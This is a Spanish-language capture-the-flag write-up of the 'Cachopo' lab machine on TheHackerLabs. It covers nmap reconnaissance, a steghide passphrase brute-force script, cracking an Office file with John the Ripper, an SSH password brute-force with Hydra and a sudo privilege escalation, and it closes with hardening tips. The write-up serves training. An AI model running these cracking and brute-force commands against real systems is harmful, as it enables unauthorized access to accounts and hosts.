---
title: "TheHackerLabs - Avanzado : [Cachopo]"
date: 2024-08-12 13:35:00 +0200
categories: [CTF, Writeups, TheHackerLabs, Linux, Avanzado]
description: "Explora el desafﾃｭo CTF 'Cachopo', diseﾃｱado para usuarios avanzados en un entorno Linux."
tags: [CTF, Writeups, TheHackerLabs, Linux, Avanzado]
image: /img/posts/CTF/cachopo/cachopo.png
---

## Introducciﾃｳnn

Bienvenidos al desafﾃｭo **"Cachopo"**, un CTF diseﾃｱado para usuarios avanzados que se lleva a cabo en un sistema operativo basado en Linux. Este reto, creado por ``@condor & @CuriosidadesDeHackers``, ofrece una excelente oportunidad para que los usuarios con experiencia se enfrenten a tareas complejas y afiancen sus habilidades en un entorno CTF. En este desafﾃｭo, se requerirﾃ｡ un dominio sﾃｳlido de las operaciones de Linux, asﾃｭ como conocimientos avanzados en tﾃｩcnicas de hacking y seguridad informﾃ｡tica.


沍 [**Web oficial del CTF: TheHackersLabs - Cachopo**](https://thehackerslabs.com/cachopo/){:target="_blank"}

## Identificaciﾃｳn de la Vﾃｭctima con Arp-Scan

Iniciamos el reto utilizando `arp-scan` para identificar la direcciﾃｳn IP de la vﾃｭctima dentro de nuestra red local. Este es un paso crucial para asegurar que los siguientes ataques sean dirigidos correctamente.

Para mﾃ｡s detalles sobre cﾃｳmo realizar este paso, he escrito un post detallado que puedes encontrar aquﾃｭ:

沍 [**Consiguiendo la IP de la Vﾃｭctima en CTFs**](/posts/consiguiendo-la-ip-victima-CTF/){:target="_blank"}

### Ejecuciﾃｳn de Arp-Scan

Desde nuestra terminal, lanzamos el siguiente comando:

```bash
笏娯楳[root@parrot]笏[/home/oscar]
笏披楳笏笊ｼ  #arp-scan -I ens36 --localnet
Interface: ens36, type: EN10MB, MAC: 00:0c:29:27:66:15, IPv4: 172.18.0.133
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
172.18.0.1	00:50:56:c0:00:08	VMware, Inc.
172.18.0.2	00:50:56:f0:e7:9f	VMware, Inc.
172.18.0.134	00:0c:29:f3:5c:ae	VMware, Inc.
172.18.0.254	00:50:56:f8:f4:23	VMware, Inc.
```


## Primer Escaneo con Nmap

Una vez identificada la direcciﾃｳn IP ( **172.18.0.134** ) de la vﾃｭctima, procedemos con un escaneo exhaustivo de todos los puertos utilizando `nmap`.


### Explicaciﾃｳn de los Parﾃ｡metros Utilizados

- **-p-**: Este parﾃ｡metro indica que se deben escanear todos los puertos (del 1 al 65535).
- **-vvv**: Aumenta el nivel de verbosidad, proporcionando mﾃ｡s detalles sobre el proceso del escaneo.
- **-n**: No resuelve nombres DNS, lo que acelera el escaneo al evitar consultas DNS.
- **-sS**: Realiza un escaneo SYN (semiabierto), que es mﾃ｡s rﾃ｡pido y sigiloso que un escaneo completo.
- **-Pn**: Omite el descubrimiento de hosts (no ping), asumiendo que el host estﾃ｡ activo.
- **--min-rate 2000**: Establece la tasa mﾃｭnima de paquetes enviados por segundo a 2000.
- **172.18.0.134**: Especifica la direcciﾃｳn IP del objetivo.
- **-oN allports**: Guarda los resultados en un archivo en formato normal (legible para humanos).

### Razﾃｳn para Usar `--min-rate 2000` en Lugar de `5000`

El parﾃ｡metro `--min-rate` controla la velocidad a la que `nmap` envﾃｭa los paquetes durante el escaneo. Establecer una tasa de 2000 paquetes por segundo es un equilibrio entre velocidad y fiabilidad. Usar una tasa mﾃ｡s alta, como 5000 paquetes por segundo, podrﾃｭa llevar a:

- **Pﾃｩrdida de Paquetes**: Las redes y dispositivos podrﾃｭan descartar paquetes debido a la alta carga, resultando en resultados menos fiables.
- **Detecciﾃｳn y Bloqueo**: Los sistemas de detecciﾃｳn de intrusiones (IDS) y cortafuegos podrﾃｭan identificar y bloquear el escaneo debido a la alta tasa de trﾃ｡fico, dificultando el escaneo exitoso.
- **Saturaciﾃｳn de la Red**: En redes mﾃ｡s lentas o congestionadas, una tasa alta podrﾃｭa saturar la red, afectando otros servicios y dispositivos.

Por estas razones, utilizamos una tasa de 2000 paquetes por segundo, lo cual proporciona un buen balance entre velocidad y precisiﾃｳn, reduciendo el riesgo de que los paquetes sean descartados o detectados como actividad maliciosa.


```bash
nmap -p- --min-rate 2000 -sS -vvv -Pn -oN allports 172.18.0.134
Nmap scan report for 172.18.0.134
Host is up, received arp-response (0.00062s latency).
Scanned at 2024-08-11 12:09:28 CEST for 15s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 00:0C:29:F3:5C:AE (VMware)
```

## Escaneo Detallado de Puertos Especﾃｭficos

Tras identificar los puertos abiertos en el primer escaneo, realizamos un escaneo mﾃ｡s detallado en los puertos que parecﾃｭan mﾃ｡s interesantes.

### Explicaciﾃｳn de los Parﾃ｡metros Utilizados

- **-sCV**: Realiza un escaneo de detecciﾃｳn de versiones y scripts (equivalente a `-sC` para ejecutar scripts de detecciﾃｳn y `-sV` para detectar versiones de servicios).
- **-p22,80**: Especifica los puertos a escanear, en este caso, el 22 (SSH) y el 80 (HTTP).
- **172.18.0.134**: Especifica la direcciﾃｳn IP del objetivo.
- **-oN ports**: Guarda los resultados en un archivo en formato normal (legible para humanos).

Este escaneo nos permitirﾃ｡ obtener mﾃ｡s informaciﾃｳn sobre los servicios que estﾃ｡n corriendo en estos puertos, incluyendo sus versiones y posibles vulnerabilidades asociadas. Realizamos el escaneo detallado utilizando el siguiente comando:

```bash
nmap -sSCV -p 22,80 -oN ports 172.18.0.134
Nmap scan report for 172.18.0.134
Host is up (0.00059s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 b4:ae:d2:8b:a8:30:a5:fb:58:a9:b2:38:73:33:1d:e0 (ECDSA)
|_  256 76:21:61:f1:f5:67:8a:95:dc:c1:73:56:16:2e:a4:a5 (ED25519)
80/tcp open  http    Apache httpd 2.4.61
|_http-title: Did not follow redirect to http://cachopo.thl/
|_http-server-header: Apache/2.4.61 (Debian)
MAC Address: 00:0C:29:F3:5C:AE (VMware)
Service Info: Host: cachopo.thl; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# Anﾃ｡lisis del Escaneo de Nmap

En el escaneo de Nmap, nos encontramos con el siguiente resultado:

*http-title: Did not follow redirect to http://cachopo.thl/*


Esto significa que Nmap detectﾃｳ que la pﾃ｡gina web estﾃ｡ configurada para redirigir a una URL diferente, en este caso `http://cachopo.thl/`. Sin embargo, Nmap no siguiﾃｳ esta redirecciﾃｳn, por lo que el anﾃ｡lisis solo muestra el tﾃｭtulo de la pﾃ｡gina original y no el contenido de la pﾃ｡gina a la que redirige.

Para resolver esto, tendremos que aﾃｱadir el nombre de dominio `cachopo.thl` y su IP en el archivo `/etc/hosts` de nuestro sistema. Esto le indicarﾃ｡ a nuestra mﾃ｡quina que el nombre de dominio `cachopo.thl` corresponde a una IP especﾃｭfica, permitiendo asﾃｭ que las redirecciones y otras solicitudes relacionadas funcionen correctamente en nuestras pruebas o anﾃ｡lisis.

## Pasos para aﾃｱadir una entrada en /etc/hosts

- Aﾃｱadimos una linea al final del archivo `/etc/hosts` con privilegios de superusuario, con la IP y la URL:

```bash
笏娯楳[root@parrot]笏[/home/oscar]
笏披楳笏笊ｼ echo "172.18.0.134 cachopo.thl" | tee -a /etc/hosts
 ```

- Revisamos la ultima linea del fichero hosts, y si, la ha aﾃｱadido.

```bash
笏娯楳[root@parrot]笏[/home/oscar]
笏披楳笏笊ｼ #tail -n 1 /etc/hosts
172.18.0.134 cachopo.thl
```


Esto deberﾃｭa ayudarnos a asegurar que las redirecciones y otros aspectos relacionados con `cachopo.thl` se manejen correctamente en nuestro entorno.


# Anﾃ｡lisis del Servidor Web y Uso de Steghide

Tras analizar el servidor web, no encontramos subdominios, directorios o ficheros que parezcan vulnerables. El cﾃｳdigo fuente del sitio solo muestra una imagen de fondo. Vamos a analizar la imagen con la herramienta **Steghide** para comprobar si hay datos ocultos en ella.

![web](/img/posts/CTF/cachopo/web.png)
![source](/img/posts/CTF/cachopo/codigo.png)

## Comando para Extraer Datos con Steghide

Ejecutamos el siguiente comando para intentar extraer datos ocultos de la imagen:

```bash
steghide --extract -sf /home/oscar/Descargas/cachopo.jpg
```

Al ejecutar el comando, obtenemos el siguiente resultado:


```bash
Anotar salvoconducto:
steghide: No pude extraer ningﾃｺn dato con ese salvoconducto!
```


# Descubrimiento de Contraseﾃｱa con Rockyou

Necesitamos encontrar una contraseﾃｱa para extraer datos de la imagen. Utilizaremos la lista de contraseﾃｱas **rockyou.txt** en un bucle para intentar cada contraseﾃｱa hasta encontrar la correcta.

A continuaciﾃｳn, preparamos el script y las rutas necesarias.

## Rutas y Script

Las rutas actuales y el script son los siguientes:

```bash
笏娯楳[root@parrot]笏[/home/oscar/Scripts]
笏披楳笏笊ｼ #l
cachopo.sh
笏娯楳[root@parrot]笏[/home/oscar/Scripts]
笏披楳笏笊ｼ #l /home/oscar/Descargas/
cachopo.jpg
笏披楳笏笊ｼ #
```

## Script `cachopo.sh`

Aquﾃｭ estﾃ｡ el script para realizar el ataque de fuerza bruta utilizando la lista de contraseﾃｱas `rockyou.txt`:

```bash
#!/bin/bash
rockyou="/usr/share/wordlists/rockyou.txt"
jpgfile="/home/oscar/Descargas/cachopo.jpg"
output=""
while IFS= read -r password; do
    output=$(steghide --extract -sf "$jpgfile" -p "$password" 2>&1)
    if [[ $output == *"salvoconducto"* ]]; then
        echo -ne "Probando la contraseﾃｱa: $password\r"
    else
        echo -e "\n------------------------------------"
        echo -e "\nContraseﾃｱa encontrada: $password"
        break
    fi
done < "$rockyou"
```

## Ejecuciﾃｳn del Script

Damos permisos de ejecuciﾃｳn al script y lo ejecutamos:

```bash
笏娯楳[笨余笏[root@parrot]笏[/home/oscar/Scripts]
笏披楳笏笊ｼ #chmod +x cachopo.sh
笏娯楳[root@parrot]笏[/home/oscar/Scripts]
笏披楳笏笊ｼ #./cachopo.sh
Probando la contraseﾃｱa: elisazrch
----------------------------------

*Contraseﾃｱa encontrada: doggies*
```

El script ha encontrado la contraseﾃｱa correcta: `doggies`. Ahora podemos usar esta contraseﾃｱa para extraer los datos de la imagen si es necesario.

# Extracciﾃｳn de Datos y Anﾃ｡lisis de Ficheros

Tras ejecutar el comando **Steghide** para extraer los datos ocultos de la imagen, encontramos un fichero llamado `directorio.txt` con el siguiente contenido:

```bash
笏娯楳[笨余笏[root@parrot]笏[/home/oscar/Scripts]
笏披楳笏笊ｼ #steghide --extract -sf /home/oscar/Descargas/cachopo.jpg
Anotar salvoconducto: 
anotﾃｳ los datos extraﾃｭdos e/"directorio.txt".
笏披楳笏笊ｼ #l
cachopot.sh*  directorio.txt
笏披楳笏笊ｼ #cat directorio.txt 
el directorio es mycachopo
```

## Acceso al Directorio

Al acceder a la URL `cachopo.thl/mycachopo`, observamos que contiene un fichero llamado `Cocineros`. Lo descargamos y, al no tener una extensiﾃｳn, revisamos la informaciﾃｳn del fichero con el siguiente comando:


```bash
笏娯楳[笨余笏[root@parrot]笏[/home/oscar/Descargas]
笏披楳笏笊ｼ #file Cocineros 
Cocineros: CDFV2 Encrypt
```

![mycachopo](/img/posts/CTF/cachopo/mycachopo.png)

## Explicaciﾃｳn del Comando `file`

El comando **`file`** se utiliza en sistemas Unix para determinar el tipo de un fichero. Analiza el contenido del fichero y proporciona una descripciﾃｳn del tipo de datos que contiene. En este caso, el comando `file` nos informa que el fichero `Cocineros` es de tipo `CDFV2 Encrypt`.

### ﾂｿQuﾃｩ es `CDFV2 Encrypt`?

**CDFV2 (Compound Document File Format Version 2)** es un formato de archivo utilizado por Microsoft para documentos complejos que pueden contener mﾃｺltiples tipos de datos y metadatos. **CDFV2 Encrypt** indica que el fichero estﾃ｡ en formato CDF versiﾃｳn 2 y estﾃ｡ cifrado. Esto significa que los datos en el fichero estﾃ｡n protegidos mediante cifrado, y se necesita una clave o herramienta especial para descifrarlos y acceder a su contenido.

Para proceder, necesitaremos encontrar una forma de descifrar el fichero CDFV2 si es que contiene informaciﾃｳn valiosa. Esto podrﾃｭa implicar el uso de herramientas especﾃｭficas de descifrado o la bﾃｺsqueda de una clave de descifrado adecuada.

# Desciframiento del Documento Cifrado

Para descifrar el fichero `Cocineros`, utilizamos una herramienta llamada **`office2john`** y **`john the ripper`**.

## Herramienta `office2john`

**`office2john`** es una herramienta incluida en el paquete de **John the Ripper** que se utiliza para extraer hashes de contraseﾃｱas de documentos de Microsoft Office cifrados. La herramienta convierte el documento cifrado en un formato que **John the Ripper** puede usar para realizar ataques de fuerza bruta.

### Comando para Extraer Hash

Ejecutamos **`office2john`** para extraer el hash de la contraseﾃｱa del fichero `Cocineros` y lo guardamos en un archivo llamado `hash`:

```bash
笏娯楳[root@parrot]笏[/home/oscar/Descargas]
笏披楳笏笊ｼ #office2john Cocineros > hash
```

## Desciframiento con `john the ripper`

Una vez que tenemos el hash, utilizamos **`john the ripper`** para realizar un ataque de fuerza bruta con la lista de contraseﾃｱas `rockyou.txt`:

```bash
笏娯楳[root@parrot]笏[/home/oscar/Descargas]
笏披楳笏笊ｼ #john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 256/256 AVX2 8x / SHA512 256/256 AVX2 4x AES])
Cost 1 (MS Office version) is 2007 for all loaded hashes
Cost 2 (iteration count) is 50000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
horse1           (Cocineros)     
1g 0:00:00:07 DONE (2024-08-11 18:58) 0.1422g/s 669.1p/s 669.1c/s 669.1C/s bobcat..alemania
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

John ha descifrado la contraseﾃｱa del documento, que es `horse1`.

## Apertura del Documento

Con la contraseﾃｱa obtenida, abrimos el documento `Cocineros` utilizando **LibreOffice** para revisar su contenido:

```bash
笏娯楳[root@parrot]笏[/home/oscar/Descargas]
笏披楳笏笊ｼ #libreoffice Cocineros
```
![passw](/img/posts/CTF/cachopo/passw.png)
![cocineros](/img/posts/CTF/cachopo/cocineros.png)


# Reflexiones y Progreso en el CTF

**Hacemos una pausa y explicamos:**

En sistemas Unix, no existe una norma estricta que obligue a que los nombres de usuario comiencen con minﾃｺsculas, pero es conveniente seguir esta convenciﾃｳn por razones de consistencia y facilidad de administraciﾃｳn. Aunque no siempre es necesario, ayuda a evitar posibles confusiones.

Despuﾃｩs de pasar casi toda la noche y la maﾃｱana trabajando en el escaneo de usuarios, decidimos utilizar **Hydra** con la lista de usuarios comunes para realizar un ataque de fuerza bruta (Primera letra en minuscula)

## Intento Inicial con Hydra

Creamos un archivo llamado `usuarios` con los nombres de usuario que querﾃｭamos probar:

```bash
笏娯楳[oscar@parrot]笏[~/Descargas]
笏披楳笏笊ｼ $cat usuarios
sofia
carlos
luis
```

Observamos que Hydra estaba tardando mucho en procesar. Para investigar, decidﾃｭ ejecutar Hydra en modo debug usando la opciﾃｳn `-d`. A continuaciﾃｳn, se muestra un extracto del debug donde se puede ver que Hydra estﾃ｡ probando todas las contraseﾃｱas para el primer usuario `sofia`:

```bash
[DEBUG] we will redo the following combination: target 172.18.0.134  child 0  login "sofia"  pass "password1"
[DEBUG] we will redo the following combination: target 172.18.0.134  child 1  login "sofia"  pass "soccer"
[DEBUG] we will redo the following combination: target 172.18.0.134  child 2  login "sofia"  pass "butterfly"
[DEBUG] we will redo the following combination: target 172.18.0.134  child 3  login "sofia"  pass "anthony"
...
```

Hydra intentarﾃ｡ todas las contraseﾃｱas indicadas en el parﾃ｡metro `-p` o `-P` para el usuario especificado. Dado que estamos usando la lista `rockyou`, Hydra no pasarﾃ｡ al siguiente usuario hasta que haya terminado de probar todas las contraseﾃｱas para el usuario actual.

### Alternativas y Soluciﾃｳn

Considerﾃｩ lanzar una instancia separada de Hydra para cada usuario: `sofia`, `carlos` y `luis`. Esto resultﾃｳ en encontrar el login exitosamente:

```bash
笏娯楳[笨余笏[root@parrot]笏[/home/oscar/Descargas]
笏披楳笏笊ｼ #hydra -l carlos -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.134   
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-11 20:11:50
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.18.0.134:22/
[STATUS] 114.00 tries/min, 114 tries in 00:01h, 14344287 to do in 2097:08h, 14 active
[STATUS] 98.67 tries/min, 296 tries in 00:03h, 14344105 to do in 2422:60h, 14 active
[22][ssh] host: 172.18.0.134   login: carlos   password: bowwow
```

Descubrimos que **Hydra** tambiﾃｩn tiene la opciﾃｳn `-u`, que permite recorrer los usuarios en lugar de las contraseﾃｱas. Esto puede ser mﾃ｡s eficiente en escenarios donde se espera que la misma contraseﾃｱa pueda ser vﾃ｡lida para varios usuarios.

## Uso de la Opciﾃｳn `-u`

La opciﾃｳn `-u` en Hydra significa "*loop around users, not passwords*" (recorrer usuarios en lugar de contraseﾃｱas). Esta opciﾃｳn cambia el orden en el que Hydra prueba las combinaciones:

- **Sin `-u`:** Hydra prueba todas las contraseﾃｱas para un usuario antes de pasar al siguiente usuario.
- **Con `-u`:** Hydra prueba todas las contraseﾃｱas para cada usuario antes de pasar a la siguiente contraseﾃｱa.

Ejemplo:
**Sin -u:**

```python

        usuario1 -> contraseﾃｱa1
        usuario1 -> contraseﾃｱa2
        usuario1 -> contraseﾃｱa3
        usuario1 -> contraseﾃｱa4
        ...
        usuario2 -> contraseﾃｱa1
        usuario2 -> contraseﾃｱa2
        usuario2 -> contraseﾃｱa3
        usuario2 -> contraseﾃｱa4
        ...
```

**Con -u:**
```python
        usuario1 -> contraseﾃｱa1
        usuario2 -> contraseﾃｱa1
        usuario3 -> contraseﾃｱa1
        usuario4 -> contraseﾃｱa1
        ...
        usuario1 -> contraseﾃｱa2
        usuario2 -> contraseﾃｱa2
        usuario3 -> contraseﾃｱa2
        usuario4 -> contraseﾃｱa2
        ...
```
Esto es ﾃｺtil cuando se sospecha que una contraseﾃｱa comﾃｺn puede ser utilizada por varios usuarios.

### Ejemplo Prﾃ｡ctico

Ejecutamos Hydra con la opciﾃｳn `-u` y en modo verbose `-v -V` para obtener una salida mﾃ｡s detallada:

```bash
笏娯楳[笨余笏[root@parrot]笏[/home/oscar/Descargas/script]
笏披楳笏笊ｼ #hydra -v -V -u -L usuarios.txt -P /usr/share/wordlists/rockyou.txt 172.18.0.134 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-11 22:50:16
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 43033197 login tries (l:3/p:14344399), ~2689575 tries per task
[DATA] attacking ssh://172.18.0.134:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://sofia@172.18.0.134:22
[INFO] Successful, password authentication is supported by ssh://172.18.0.134:22
[ATTEMPT] target 172.18.0.134 - login "sofia" - pass "123456" - 1 of 43033197 [child 0] (0/0)
[ATTEMPT] target 172.18.0.134 - login "carlos" - pass "123456" - 2 of 43033197 [child 1] (0/0)
...
[ATTEMPT] target 172.18.0.134 - login "luis" - pass "rockyou" - 22 of 43033198 [child 15] (0/1)
[ATTEMPT] target 172.18.0.134 - login "sofia" - pass "12345678" - 23 of 43033198 [child 5] (0/1)
...
```

La ejecuciﾃｳn en modo verbose mostrﾃｳ que Hydra estaba probando cada combinaciﾃｳn de usuario y contraseﾃｱa como se esperaba. Finalmente, ejecutamos Hydra sin verbose para mejorar la eficiencia.

```bash
笏娯楳[root@parrot]笏[/home/oscar/Descargas/script]
笏披楳笏笊ｼ #hydra -u -L usuarios.txt -P /usr/share/wordlists/rockyou.txt 172.18.0.134 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-08-11 22:50:36
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 43033197 login tries (l:3/p:14344399), ~2689575 tries per task
[DATA] attacking ssh://172.18.0.134:22/
[STATUS] 299.00 tries/min, 299 tries in 00:01h, 43032899 to do in 2398:43h, 15 active
[22][ssh] host: 172.18.0.134   login: carlos   password: bowwow
```

Finalmente, obtuvimos la contraseﾃｱa utilizando un archivo con varios usuarios y otro con contraseﾃｱas. Este proceso subraya la importancia de revisar la documentaciﾃｳn y las ayudas oficiales de la herramienta que estamos utilizando.

**Fin de la pausa, seguimos**


# Conexiﾃｳn SSH y Escalaciﾃｳn de Privilegios

Nos conectamos al servidor usando SSH con el usuario `carlos`:

```bash
笏披楳笏笊ｼ #ssh carlos@172.18.0.134
The authenticity of host '172.18.0.134 (172.18.0.134)' can't be established.
ED25519 key fingerprint is SHA256:TwxUt/2Cw+RBXmkw35lCwjyjcXY9BpomAJBscsWYUC4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.18.0.134' (ED25519) to the list of known hosts.
carlos@172.18.0.134's password: 
Linux Cachopo 6.1.0-22-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.94-1 (2024-06-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug 11 21:29:23 2024 from 172.18.0.133
carlos@Cachopo:~$ 
```

Estamos dentro del sistema como el usuario `carlos`. A continuaciﾃｳn, comenzamos a investigar los privilegios disponibles con el comando `sudo -l`:

```bash
carlos@Cachopo:~$ sudo -l
Matching Defaults entries for carlos on Cachopo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User carlos may run the following commands on Cachopo:
    (ALL) NOPASSWD: /usr/bin/crash
carlos@Cachopo:~$ 
```

El resultado indica que el usuario `carlos` puede ejecutar el comando `/usr/bin/crash` con privilegios de superusuario (`sudo`) sin necesidad de proporcionar una contraseﾃｱa.

## Escalaciﾃｳn de Privilegios con el Binario `crash`

El binario `crash` estﾃ｡ disponible para ejecuciﾃｳn sin contraseﾃｱa, lo que significa que podemos usarlo para intentar escalar nuestros privilegios. El binario `crash` es una herramienta de depuraciﾃｳn para el nﾃｺcleo de Linux, y en algunos casos, puede ser utilizado para obtener acceso root dependiendo de su configuraciﾃｳn y el entorno del sistema.

En https://gtfobins.github.io/gtfobins/crash/ tenemos la explicaciﾃｳn de como explotar la vulnerabilidad.

![vuln](/img/posts/CTF/cachopo/sh.png)
![root](/img/posts/CTF/cachopo/root.png)


# Medidas de Seguridad para Prevenir Vulnerabilidades

## 1. Revisar y Corregir Configuraciones de Servicios

- **Configurar Servicios de Forma Segura:** Revisa la configuraciﾃｳn de servicios activos. Por ejemplo, en un servidor web, configura adecuadamente los archivos `.htaccess` para restringir el acceso.

## 2. Aplicar Actualizaciones y Parches
- **Actualizar el Sistema Regularmente:** Mantﾃｩn el sistema operativo y todas las aplicaciones actualizadas.
```bash
  sudo apt-get update
  sudo apt-get upgrade
```

- **Aplicar Parches de Seguridad:** Instala parches y actualizaciones de seguridad proporcionados por los proveedores de software.

## 3. Implementar Control de Acceso Adecuado
- **Configurar Permisos de Archivos:** Asegﾃｺrate de que los archivos y directorios tengan los permisos mﾃｭnimos necesarios.
```bash
  chmod 600 archivo.txt
```

- **Revisar Configuraciﾃｳn de Usuario y Grupos:** Verifica que los usuarios y grupos tengan los permisos adecuados y revisa las polﾃｭticas de acceso.

## 4. Monitorizaciﾃｳn y Auditorﾃｭa
- **Habilitar Registros de Actividad:** Configura el sistema para registrar eventos importantes y monitorear accesos.
 ```bash
  sudo apt-get install auditd
  sudo systemctl start auditd
```

- **Revisar Registros Regularmente:** Revisa los registros de actividad para detectar posibles intentos de acceso no autorizado o comportamientos sospechosos.

## 5. Utilizar Medidas de Seguridad Adicionales
- **Implementar Cortafuegos:** Configura un firewall para controlar el trﾃ｡fico entrante y saliente.
```bash
  sudo ufw enable
  sudo ufw allow ssh
```

- **Aplicar Seguridad a Nivel de Aplicaciﾃｳn:** Asegﾃｺrate de que las aplicaciones web estﾃｩn protegidas contra ataques comunes como SQL Injection y XSS.



Gracias por leer hasta aquﾃｭ. Un saludo, ﾃ都car